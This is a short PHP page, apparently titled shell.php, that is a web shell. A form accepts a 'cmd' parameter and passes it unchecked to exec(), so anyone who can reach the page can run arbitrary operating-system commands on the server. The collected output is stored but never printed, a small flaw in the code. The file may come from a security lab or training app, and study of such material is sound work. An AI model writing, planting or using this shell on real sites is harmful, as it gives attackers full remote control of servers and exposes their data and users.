<?php
require_once("../../utils.php");
printHTMLHeader();
?>

<form action='shell.php'>
<label for='command'>Command: </label>
<input type='text' id='cmd' name='cmd'>
<input type='submit' value='Submit'>
</form>

<?php
if (isset($_GET['cmd'])) {
	$res = null;
	exec($_GET['cmd'], $res);
	foreach ($res as $line) {
		$content .= $line . "<br>";
	}
}

printHTMLFooter();
?>
